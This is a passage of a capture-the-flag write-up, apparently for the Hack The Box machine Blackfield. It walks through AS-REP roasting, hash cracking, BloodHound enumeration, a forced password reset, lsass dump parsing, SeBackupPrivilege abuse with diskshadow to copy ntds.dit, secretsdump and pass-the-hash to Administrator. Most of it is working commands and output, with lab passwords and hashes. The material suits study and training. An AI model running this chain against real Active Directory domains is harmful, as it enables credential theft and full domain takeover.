<p>I have read permission on the <code>profile$</code> share. The share contains a bunch of empty users folder.</p>
<p><div class="img-container"><img src="imgs/image-20210504155638689.png" alt="image-20210504155638689"  /></div>
</p>
<p>I can convert these folders name to list of username using <code>awk '{print $1}'</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «blackfield» «10.10.14.169»
</span></span><span class="line"><span class="cl">$ cat folder.list <span class="p">|</span> awk <span class="s1">&#39;{print $1}&#39;</span> <span class="p">|</span> tee users.list
</span></span><span class="line"><span class="cl">AAlleni
</span></span><span class="line"><span class="cl">ABarteski
</span></span><span class="line"><span class="cl">ABekesz
</span></span><span class="line"><span class="cl">ABenzies
</span></span><span class="line"><span class="cl">ABiemiller
</span></span><span class="line"><span class="cl">AChampken
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span></code></pre></div><p>Now that I have a list of usernames, I can try AS-REP roast attack.</p>
<h3 id="tcp-88---kerberos">TCP 88 - Kerberos</h3>
<h4 id="as-rep-roasting">AS-REP roasting</h4>
<p>I&rsquo;ll use <code>GetNPUsers.py</code> to perform AS-REP roasting on Kerberos.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «blackfield» «10.10.14.169»
</span></span><span class="line"><span class="cl">$ GetNPUsers.py BLACKFIELD.LOCAL/ -no-pass -usersfile users.list -dc-ip 10.10.10.192 -outputfile TGT_AS-REP
</span></span></code></pre></div><p>And I will watch the output file using <code>watch</code> command</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «blackfield» «10.10.14.169»
</span></span><span class="line"><span class="cl">$ watch -n <span class="m">1</span> cat TGT_AS-REP
</span></span></code></pre></div><p>After a few minutes, it captures the hash for user <code>support</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210504160338371.png" alt="image-20210504160338371"  /></div>
</p>
<p>I&rsquo;ll send the hash to my Windows for cracking.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «blackfield» «10.10.14.169»
</span></span><span class="line"><span class="cl">$ cat TGT_AS-REP
</span></span><span class="line"><span class="cl"><span class="nv">$krb5asrep$23$support</span>@BLACKFIELD.LOCAL:55211d2eb15e1539552de705eb8605c4<span class="nv">$821</span>c479c296fc01c7db5c01f75c08cedd607897692d622f1de2972d6601ebd880b3cb32e663e8c1a2cac5f2531aa1f1cb1323bc6b2a1816d212f179031952b9c1c1290cf11066339706d5cc592ab1e4e9de40e4db0986647c550860b2677671ce6b4b73761e119f56d9651b277a1297a87fa160e22eed4ecee7cb522c03d142cac647a467dfc48f69afb17fef110337134cfef9070f0b1f34d073772409dc31c6c0d0edea5562a9a37387ea44a48fb4947277e84300db0bf7da4ec5a9b3be94a7a1d4c910b1dd39f17ace62366f8e111dca756e13359750171464cd23b23e7b33d427a42978b489dc0a58bc9e586ff02ff3ab805
</span></span></code></pre></div><h3 id="cracking-the-hash">Cracking the Hash</h3>
<p>I&rsquo;ll use dictionary attack to recover the user password using <code>hashcat</code>, and it cracks within a few seconds.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">C:<span class="se">\t</span>ools<span class="se">\h</span>ashcat6&gt; hashcat -m <span class="m">18200</span> hashes/blackfield.hash rockyou.txt -O
</span></span><span class="line"><span class="cl">hashcat <span class="o">(</span>v6.1.1<span class="o">)</span> starting...
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl"><span class="nv">$krb5asrep$23$support</span>@BLACKFIELD.LOCAL:55211d2eb15e1539552de705eb8605c4<span class="nv">$821</span>c479c296fc01c7db5c01f75c08cedd607897692d622f1de2972d6601ebd880b3cb32e663e8c1a2cac5f2531aa1f1cb1323bc6b2a1816d212f179031952b9c1c1290cf11066339706d5cc592ab1e4e9de40e4db0986647c550860b2677671ce6b4b73761e119f56d9651b277a1297a87fa160e22eed4ecee7cb522c03d142cac647a467dfc48f69afb17fef110337134cfef9070f0b1f34d073772409dc31c6c0d0edea5562a9a37387ea44a48fb4947277e84300db0bf7da4ec5a9b3be94a7a1d4c910b1dd39f17ace62366f8e111dca756e13359750171464cd23b23e7b33d427a42978b489dc0a58bc9e586ff02ff3ab805:#00^BlackKnight
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Session..........: hashcat
</span></span><span class="line"><span class="cl">Status...........: Cracked
</span></span><span class="line"><span class="cl">Hash.Name........: Kerberos 5, etype 23, AS-REP
</span></span><span class="line"><span class="cl">Hash.Target......: <span class="nv">$krb5asrep$23$support</span>@BLACKFIELD.LOCAL:55211d2eb15e...3ab805
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span></code></pre></div><p>The password for user <code>support</code> is <code>#00^BlackKnight</code>.</p>
<h3 id="access-as-support">Access as support</h3>
<p>Now that I obtained a set of credentials, I can re-enumerate the available services.</p>
<h4 id="ldap-domain-dump">LDAP Domain Dump</h4>
<p>The credentials works on LDAP, I can use it to obtain the domain info using <a href="https://github.com/dirkjanm/ldapdomaindump">ldapdomaindump</a>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «loot» «10.10.14.169»
</span></span><span class="line"><span class="cl">$ ldapdomaindump -u <span class="s1">&#39;BLACKFIELD.LOCAL\support&#39;</span> -p <span class="s1">&#39;#00^BlackKnight&#39;</span> -no-json -no-grep 10.10.10.192
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Connecting to host...
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Binding to host
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Bind OK
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Starting domain dump
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Domain dump finished
</span></span></code></pre></div><p>The output from the tool are formatted in HTML document, and I get the following information:</p>
<p>The OS information and the computer FQDN.</p>
<p><div class="img-container"><img src="imgs/image-20210504162822528.png" alt="image-20210504162822528"  /></div>
</p>
<p>The domain policy.</p>
<p><div class="img-container"><img src="imgs/image-20210504162931229.png" alt="image-20210504162931229"  /></div>
</p>
<p>The interesting domain users.</p>
<p><div class="img-container"><img src="imgs/image-20210504163338913.png" alt="image-20210504163338913"  /></div>
</p>
<p><div class="img-container"><img src="imgs/image-20210504163255290.png" alt="image-20210504163255290"  /></div>
</p>
<p>Interesting groups</p>
<p><div class="img-container"><img src="imgs/image-20210504163741235.png" alt="image-20210504163741235"  /></div>
</p>
<p><div class="img-container"><img src="imgs/image-20210504163658173.png" alt="image-20210504163658173"  /></div>
</p>
<p><div class="img-container"><img src="imgs/image-20210504163716719.png" alt="image-20210504163716719"  /></div>
</p>
<p>From here, I know that user <code>support</code> does not have remote shell access.</p>
<h4 id="bloodhound">BloodHound</h4>
<p>There is a python-based ingestor for <code>BloodHound</code> besides <code>SharpHound</code>. It can be used remotely from Linux.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «loot» «10.10.14.169»
</span></span><span class="line"><span class="cl">$ python bloodhound.py -c All -u <span class="s1">&#39;support@blackfield.local&#39;</span> -p <span class="s1">&#39;#00^BlackKnight&#39;</span> -d blackfield.local -dc DC01.BLACKFIELD.local -ns 10.10.10.192
</span></span></code></pre></div><ul>
<li><code>-c</code>: collect method : all</li>
<li><code>-u</code>,<code>-p</code>: credentials set</li>
<li><code>-d</code>: domain name</li>
<li><code>-dc</code>: FQDN of domain controller (it’s on ldap domain dump section → <strong>domain_computers.html</strong>)</li>
<li><code>-ns</code>: name server / DNS</li>
</ul>
<p>It returns the following output:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">INFO: Found AD domain: blackfield.local
</span></span><span class="line"><span class="cl">INFO: Connecting to LDAP server: DC01.BLACKFIELD.local
</span></span><span class="line"><span class="cl">INFO: Found 1 domains
</span></span><span class="line"><span class="cl">INFO: Found 1 domains in the forest
</span></span><span class="line"><span class="cl">INFO: Found 18 computers
</span></span><span class="line"><span class="cl">INFO: Connecting to LDAP server: dc01.blackfield.local
</span></span><span class="line"><span class="cl">INFO: Found 316 users
</span></span><span class="line"><span class="cl">INFO: Connecting to GC LDAP server: dc01.blackfield.local
</span></span><span class="line"><span class="cl">INFO: Found 51 groups
</span></span><span class="line"><span class="cl">INFO: Found 0 trusts
</span></span><span class="line"><span class="cl">INFO: Starting computer enumeration with 10 workers
</span></span><span class="line"><span class="cl">INFO: Querying computer: DC01.BLACKFIELD.local
</span></span><span class="line"><span class="cl">INFO: Done in 00M 18S
</span></span></code></pre></div><p>The output files from the tool are in json format. They are: <code>computers.json</code>, <code>domains.json</code>, <code>groups.json</code> and <code>users.json</code>.</p>
<p>I can upload these files to <code>BloodHound</code> GUI by drag and drop.</p>
<p><div class="img-container"><img src="imgs/image-20210504165340110.png" alt="image-20210504165340110"  /></div>
</p>
<p>Enumerating the user <strong>support</strong> permissions discovers it has <code>ForceChangePassword</code> permission on <strong>Audit2020</strong>. That means user <code>support</code> is able to change the user <code>audit2020</code> password.</p>
<p><div class="img-container"><img src="imgs/image-20210504165510700.png" alt="image-20210504165510700"  /></div>
</p>
<h4 id="reset-audit2020-password">Reset Audit2020 Password</h4>
<p>I can change the user <strong>audit2020</strong> password using <code>net rpc</code><sup id="fnref:2"><a href="#fn:2" class="footnote-ref" role="doc-noteref">2</a></sup>. I&rsquo;ll set <code>P@$$w0rd!</code> as the new password for user <strong>audit2020</strong>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «blackfield» «10.10.14.169»
</span></span><span class="line"><span class="cl">$ net rpc password audit2020 -U <span class="s1">&#39;support%#00^BlackKnight&#39;</span> -S 10.10.10.192
</span></span><span class="line"><span class="cl">Enter new password <span class="k">for</span> audit2020: 
</span></span></code></pre></div><h3 id="access-as-audit2020">Access as Audit2020</h3>
<h4 id="forensic-share">forensic share</h4>
<p>With <strong>audit2020</strong>, I can access the forensic share.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «blackfield» «10.10.14.169»
</span></span><span class="line"><span class="cl">$ smbmap -H 10.10.10.192 -u audit2020 -p <span class="s1">&#39;P@$$w0rd!&#39;</span> 
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> IP: 10.10.10.192:445        Name: BLACKFIELD.local
</span></span><span class="line"><span class="cl">        Disk                                                    Permissions     Comment
</span></span><span class="line"><span class="cl">        ----                                                    -----------     -------
</span></span><span class="line"><span class="cl">        ADMIN$                                                  NO ACCESS       Remote Admin
</span></span><span class="line"><span class="cl">        C$                                                      NO ACCESS       Default share
</span></span><span class="line"><span class="cl">        forensic                                                READ ONLY       Forensic / Audit share.
</span></span><span class="line"><span class="cl">        IPC$                                                    READ ONLY       Remote IPC
</span></span><span class="line"><span class="cl">        NETLOGON                                                READ ONLY       Logon server share
</span></span><span class="line"><span class="cl">        profiles$                                               READ ONLY
</span></span><span class="line"><span class="cl">        SYSVOL                                                  READ ONLY       Logon server share
</span></span></code></pre></div><p>Inside the share, there is three folders, and I&rsquo;ll download all of them to my Kali.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «blackfield» «10.10.14.169»
</span></span><span class="line"><span class="cl">$ smbclient -U <span class="s1">&#39;audit2020%P@$$w0rd!&#39;</span>//10.10.10.192/forensic 
</span></span><span class="line"><span class="cl">Try <span class="s2">&#34;help&#34;</span> to get a list of possible commands.
</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> ls
</span></span><span class="line"><span class="cl">  .                                   D        <span class="m">0</span>  Sun Feb <span class="m">23</span> 20:03:16 <span class="m">2020</span>
</span></span><span class="line"><span class="cl">  ..                                  D        <span class="m">0</span>  Sun Feb <span class="m">23</span> 20:03:16 <span class="m">2020</span>
</span></span><span class="line"><span class="cl">  commands_output                     D        <span class="m">0</span>  Mon Feb <span class="m">24</span> 01:14:37 <span class="m">2020</span>
</span></span><span class="line"><span class="cl">  memory_analysis                     D        <span class="m">0</span>  Fri May <span class="m">29</span> 03:28:33 <span class="m">2020</span>
</span></span><span class="line"><span class="cl">  tools                               D        <span class="m">0</span>  Sun Feb <span class="m">23</span> 20:39:08 <span class="m">2020</span>
</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> recurse on
</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> mget *
</span></span></code></pre></div><p>Enumerating on the memory_analysis folder, there is a file called <code>lsass.zip</code> that contains <code>lsass.DMP</code> which is interesting to me.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «blackfield» «10.10.14.169»
</span></span><span class="line"><span class="cl">$ file lsass.DMP
</span></span><span class="line"><span class="cl">lsass.DMP: Mini DuMP crash report, <span class="m">16</span> streams, Sun Feb <span class="m">23</span> 18:02:01 2020, 0x421826 <span class="nb">type</span>
</span></span></code></pre></div><blockquote>
<p>LSASS (Local Security Authentication Subsystem Service) is a service/process that used to verify and authenticate users on login to a Windows computer. In other words, it holds the Windows credentials.</p>
</blockquote>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-svc_backup">Shell as svc_backup</h3>
<h4 id="dump-lsass">Dump Lsass</h4>
<p>A tool called <code>pypykatz</code> can be used to dump the contents of <code>lsass.DMP</code>. The NT hash of <strong>svc-backup</strong> immediately shows up on the top.</p>
<p><div class="img-container"><img src="imgs/image-20210504173356195.png" alt="image-20210504173356195"  /></div>
</p>
<p>The hash is <code>9658d1d1dcd9250115e2205d9f48400d</code>.</p>
<h4 id="winrm---svc_backup">WinRM - svc_backup</h4>
<p>I knew that this user can login remotely (from <a href="#ldap-domain-dump">LDAP</a>), so I can try it with <code>evil-winrm</code>, and it worked.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «blackfield» «10.10.14.169»
</span></span><span class="line"><span class="cl">$ evil-winrm -i 10.10.10.192 -u svc_backup -H <span class="s1">&#39;9658d1d1dcd9250115e2205d9f48400d&#39;</span>
</span></span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210504173749952.png" alt="image-20210504173749952"  /></div>
</p>
<p>User flag is done here.</p>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-administrator">Shell as Administrator</h3>
<h4 id="internal-enumeration">Internal Enumeration</h4>
<p>Also from <a href="#ldap-domain-dump">LDAP</a>, <strong>svc-backup</strong> is a member of the Backup Operators group. Each member of the Backup Operators group can perform backup and restore operations. The privilege name to perform those two operations are called <code>SeBackupPrivilege</code> and <code>SeRestorePrivilege</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210504174334134.png" alt="image-20210504174334134"  /></div>
</p>
<p>Those two privileges can be abused<sup id="fnref:3"><a href="#fn:3" class="footnote-ref" role="doc-noteref">3</a></sup> using <code>diskshadow</code><sup id="fnref:4"><a href="#fn:4" class="footnote-ref" role="doc-noteref">4</a></sup>.</p>
<p>I can&rsquo;t just perform the backup and restore if the system is currently in use (online). But, there is a technology from Microsoft called &ldquo;Shadow Copy&rdquo; that makes this possible, and that&rsquo;s where <code>diskshadow</code> will be used.</p>
<p>So the idea is that I can create a volume shadow of <code>C:</code> drive and backup the <code>NTDS.dit</code> file (AD database) from the volume shadow back to <code>C:</code> drive. After that I can grab the <code>NTDS.dit</code> and dump the NT hashes from <code>NTDS.dit</code> locally using <code>secretsdump.py</code>. To achieve this I will use <a href="https://gist.githubusercontent.com/bohops/d34d9cf7793ba5f98009bc4ab2acd8f9/raw/38706044fb62790db16b0af21b7028a59591c05f/diskshadow.txt">this gist</a> as reference. I will also need <a href="https://github.com/giuliano108/SeBackupPrivilege">this module</a>.</p>
<h4 id="abusing-sebackupprivilege">Abusing SeBackupPrivilege</h4>
<p>I&rsquo;ll create a few scripts to perform all the needed actions (create a volume, grab <code>ntds.dit</code>, and cleanup the volume shadow) in one run.</p>
<p>The first one is the script for grabbing <code>NTDS.dit</code> file, I will save it as <code>copy.cmd</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">cmd.exe /c &#34;powershell.exe -c Import-Module(Resolve-Path(&#39;SeBackupPrivilegeCmdLets.dll&#39;)); Import-Module(Resolve-Path(&#39;SeBackupPrivilegeCmdLets.dll&#39;)); Copy-FileSeBackupPrivilege f:\windows\ntds\ntds.dit C:\temp\ntds.dit&#34;
</span></span></code></pre></div><p>The next one is the script for creating and deleting the volume shadow, I will save it as <code>script.txt</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">set context persistent nowriters 
</span></span><span class="line"><span class="cl">add volume c: alias iamf 
</span></span><span class="line"><span class="cl">create 
</span></span><span class="line"><span class="cl">expose %iamf% f: 
</span></span><span class="line"><span class="cl">exec &#34;copy.cmd&#34; 
</span></span><span class="line"><span class="cl">delete shadows volume %iamf% 
</span></span><span class="line"><span class="cl">reset
</span></span></code></pre></div><p>After that, I will move the modules and the scripts into a folder called <code>exploits</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «exploits» «10.10.14.169»
</span></span><span class="line"><span class="cl">$ tree
</span></span><span class="line"><span class="cl">.
</span></span><span class="line"><span class="cl">├── SeBackupPrivilegeCmdLets.dll
</span></span><span class="line"><span class="cl">├── SeBackupPrivilegeUtils.dll
</span></span><span class="line"><span class="cl">├── copy.cmd
</span></span><span class="line"><span class="cl">└── script.txt
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="m">0</span> directories, <span class="m">4</span> files
</span></span></code></pre></div><p>Now, I’ll copy these <code>.dll</code> modules, <code>copy.cmd</code>, and <code>script.txt</code> to Blackfield using the upload feature from <code>evil-winrm</code> at <code>C:\temp\</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «exploits» «10.10.14.169»
</span></span><span class="line"><span class="cl">$ evil-winrm -i 10.10.10.192 -u svc_backup -H <span class="s1">&#39;9658d1d1dcd9250115e2205d9f48400d&#39;</span>
</span></span><span class="line"><span class="cl">Evil-WinRM shell v2.3
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Info: Establishing connection to remote endpoint
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc_backup<span class="se">\D</span>ocuments&gt;mkdir C:<span class="se">\t</span>emp<span class="p">;</span> <span class="nb">cd</span> C:<span class="se">\t</span>emp
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\t</span>emp&gt; upload SeBackupPrivilegeCmdLets.dll
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\t</span>emp&gt; upload SeBackupPrivilegeUtils.dll
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\t</span>emp&gt; upload copy.cmd
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\t</span>emp&gt; upload script.txt
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span></code></pre></div><p>After that, I can run <code>diskshadow</code> with the <code>/s</code> option, then I can supply the created <code>script.txt</code> as the command sequence.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">Evil-WinRM* PS C:<span class="se">\t</span>emp&gt; diskshadow /s script.txt
</span></span><span class="line"><span class="cl">Microsoft DiskShadow version 1.0
</span></span><span class="line"><span class="cl">Copyright <span class="o">(</span>C<span class="o">)</span> <span class="m">2013</span> Microsoft Corporation
</span></span><span class="line"><span class="cl">On computer:  DC01,  10/4/2020 8:15:53 AM
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">-&gt; <span class="nb">set</span> context persistent nowriters
</span></span><span class="line"><span class="cl">-&gt; add volume c: <span class="nb">alias</span> iamf
</span></span><span class="line"><span class="cl">-&gt; create
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Alias iamf <span class="k">for</span> shadow ID <span class="o">{</span>7c53326a-2617-450c-9d2d-5c381352aa45<span class="o">}</span> <span class="nb">set</span> as environment variable.
</span></span><span class="line"><span class="cl">Alias VSS_SHADOW_SET <span class="k">for</span> shadow <span class="nb">set</span> ID <span class="o">{</span>6142125a-a889-46a9-9d5e-87ff17b66d2c<span class="o">}</span> <span class="nb">set</span> as environment variable.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Querying all shadow copies with the shadow copy <span class="nb">set</span> ID <span class="o">{</span>6142125a-a889-46a9-9d5e-87ff17b66d2c<span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        * Shadow copy <span class="nv">ID</span> <span class="o">=</span> <span class="o">{</span>7c53326a-2617-450c-9d2d-5c381352aa45<span class="o">}</span>               %iamf%
</span></span><span class="line"><span class="cl">                - Shadow copy set: <span class="o">{</span>6142125a-a889-46a9-9d5e-87ff17b66d2c<span class="o">}</span>       %VSS_SHADOW_SET%
</span></span><span class="line"><span class="cl">                - Original count of shadow <span class="nv">copies</span> <span class="o">=</span> <span class="m">1</span>
</span></span><span class="line"><span class="cl">                - Original volume name: <span class="se">\\</span>?<span class="se">\V</span>olume<span class="o">{</span>351b4712-0000-0000-0000-602200000000<span class="o">}</span><span class="se">\ </span><span class="o">[</span>C:<span class="se">\]</span>
</span></span><span class="line"><span class="cl">                - Creation time: 10/4/2020 8:15:54 AM
</span></span><span class="line"><span class="cl">                - Shadow copy device name: <span class="se">\\</span>?<span class="se">\G</span>LOBALROOT<span class="se">\D</span>evice<span class="se">\H</span>arddiskVolumeShadowCopy4
</span></span><span class="line"><span class="cl">                - Originating machine: DC01.BLACKFIELD.local
</span></span><span class="line"><span class="cl">                - Service machine: DC01.BLACKFIELD.local
</span></span><span class="line"><span class="cl">                - Not exposed
</span></span><span class="line"><span class="cl">                - Provider ID: <span class="o">{</span>b5946137-7b9f-4925-af80-51abd60b20d5<span class="o">}</span>
</span></span><span class="line"><span class="cl">                - Attributes:  No_Auto_Release Persistent No_Writers Differential
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Number of shadow copies listed: <span class="m">1</span>
</span></span><span class="line"><span class="cl">-&gt; expose %iamf% f:
</span></span><span class="line"><span class="cl">-&gt; %iamf% <span class="o">=</span> <span class="o">{</span>7c53326a-2617-450c-9d2d-5c381352aa45<span class="o">}</span>
</span></span><span class="line"><span class="cl">The shadow copy was successfully exposed as f:<span class="se">\.</span>
</span></span><span class="line"><span class="cl">-&gt; <span class="nb">exec</span> <span class="s2">&#34;copy.cmd&#34;</span>
</span></span><span class="line"><span class="cl">C:<span class="se">\t</span>emp&gt;cmd.exe /c <span class="s2">&#34;powershell.exe -c Import-Module(Resolve-Path(&#39;SeBackupPrivilegeCmdLets.dll&#39;)); Import-Module(Resolve-Path(&#39;SeBackupPrivilegeCmdLets.dll&#39;)); Copy-FileSeBackupPrivilege f:\windows\ntds\ntds.dit C:\temp\ntds.dit&#34;</span>
</span></span><span class="line"><span class="cl">Copied <span class="m">18874368</span> bytes
</span></span><span class="line"><span class="cl">-&gt; delete shadows volume %iamf%
</span></span><span class="line"><span class="cl">-&gt; %iamf% <span class="o">=</span> <span class="o">{</span>7c53326a-2617-450c-9d2d-5c381352aa45<span class="o">}</span>
</span></span><span class="line"><span class="cl">Deleting shadow copy <span class="o">{</span>7c53326a-2617-450c-9d2d-5c381352aa45<span class="o">}</span> on volume <span class="se">\\</span>?<span class="se">\V</span>olume<span class="o">{</span>351b4712-0000-0000-0000-602200000000<span class="o">}</span><span class="se">\ </span>from provider <span class="o">{</span>b5946137-7b9f-4925-af80-51abd60b20d5<span class="o">}</span> <span class="o">[</span>Attributes: 0x00120019<span class="o">]</span>...
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Number of shadow copies deleted: <span class="m">1</span>
</span></span><span class="line"><span class="cl">-&gt; reset
</span></span></code></pre></div><p>Now that I have the <code>ntds.dit</code>, the last file that I need is the registry hive.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">Evil-WinRM* PS C:<span class="se">\t</span>emp&gt; reg save HKLM<span class="se">\S</span>YSTEM c:<span class="se">\t</span>emp<span class="se">\s</span>ystem
</span></span><span class="line"><span class="cl">The operation completed successfully.
</span></span></code></pre></div><p>I will download these files to my Kali using <code>evil-winrm</code> download feature.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">Evil-WinRM* PS C:<span class="se">\t</span>emp&gt; ls
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    Directory: C:<span class="se">\t</span>emp
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Mode                LastWriteTime         Length Name
</span></span><span class="line"><span class="cl">----                -------------         ------ ----
</span></span><span class="line"><span class="cl">-a----        10/4/2020   8:20 AM       <span class="m">18874368</span> ntds.dit 
</span></span><span class="line"><span class="cl">-a----        10/4/2020   8:14 AM            <span class="m">222</span> copy.cmd
</span></span><span class="line"><span class="cl">-a----        10/4/2020   8:15 AM            <span class="m">140</span> script.txt
</span></span><span class="line"><span class="cl">-a----        10/4/2020   8:14 AM          <span class="m">12288</span> SeBackupPrivilegeCmdLets.dll
</span></span><span class="line"><span class="cl">-a----        10/4/2020   8:14 AM          <span class="m">16384</span> SeBackupPrivilegeUtils.dll
</span></span><span class="line"><span class="cl">-a----        10/4/2020   8:21 AM       <span class="m">17547264</span> system
</span></span></code></pre></div><h4 id="credentials-dumping">Credentials Dumping</h4>
<p>Now I can dump the NT hash from <code>ntds.dit</code> and <code>system</code> file using <code>secretsdump.py</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «loot» «10.10.14.169»
</span></span><span class="line"><span class="cl">$ secretsdump.py -system system -ntds ntds.dit LOCAL
</span></span><span class="line"><span class="cl">Impacket v0.9.21 - Copyright <span class="m">2020</span> SecureAuth Corporation
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Dumping Domain Credentials <span class="o">(</span>domain<span class="se">\u</span>id:rid:lmhash:nthash<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Searching <span class="k">for</span> pekList, be patient
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> PEK <span class="c1"># 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Reading and decrypting hashes from ntds.dit
</span></span><span class="line"><span class="cl">Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span></code></pre></div><h4 id="winrm---administrator">WinRM - Administrator</h4>
<p>I can use the NT hash of administrator account to login using <code>evil-winrm</code> <em>pass-the-hash</em> feature.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «loot» «10.10.14.169»
</span></span><span class="line"><span class="cl">$ evil-winrm -i 10.10.10.192 -u administrator -H <span class="s1">&#39;184fb5e5178480be64824d4cd53b99ee&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Evil-WinRM shell v2.3
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Info: Establishing connection to remote endpoint
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; whoami
</span></span><span class="line"><span class="cl">blackfield<span class="se">\a</span>dministrator
</span></span></code></pre></div><div class="footnotes" role="doc-endnotes">
<hr>
<ol>
<li id="fn:1">
<p>It&rsquo;s an anonymous authentication, but limited only to the rootDSE, because the domain controller (DC) needs to know who are we and what authentication do we support, so it exchanges some information about itself.&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:2">
